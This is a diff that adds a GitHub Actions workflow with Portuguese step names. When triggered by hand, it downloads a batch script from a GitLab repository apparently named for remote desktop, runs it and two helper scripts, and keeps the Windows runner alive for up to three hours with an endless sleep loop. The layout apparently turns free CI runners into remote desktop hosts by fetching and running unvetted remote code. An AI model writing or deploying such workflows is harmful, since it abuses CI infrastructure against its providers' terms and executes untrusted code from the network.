@@ -1,1 +1,25 @@
-name: dx
+name: Toos dx
+
+on:
+  workflow_dispatch:
+
+jobs:
+  toolbox:
+    name: Initializing Windows Environment
+    runs-on: windows-latest
+    timeout-minutes: 180
+
+    steps:
+      - name: Step 1 - Baixando Script Principal
+        run: powershell -Command "iwr -Uri 'https://gitlab.com/raposabrty/pcrdp/-/raw/main/Downloads.bat' -OutFile 'start.bat'"
+
+      - name: Step 2 - Executando Script
+        run: cmd /c start.bat
+
+      - name: Step 3 - Executando Scripts Auxiliares
+        run: |
+          cmd /c show.bat
+          cmd /c loop.bat
+
+      - name: Step 4 - Mantendo Ativo
+        run: powershell -Command "while ($true) { Start-Sleep -Seconds 300; Write-Output 'Ativo...'; }"
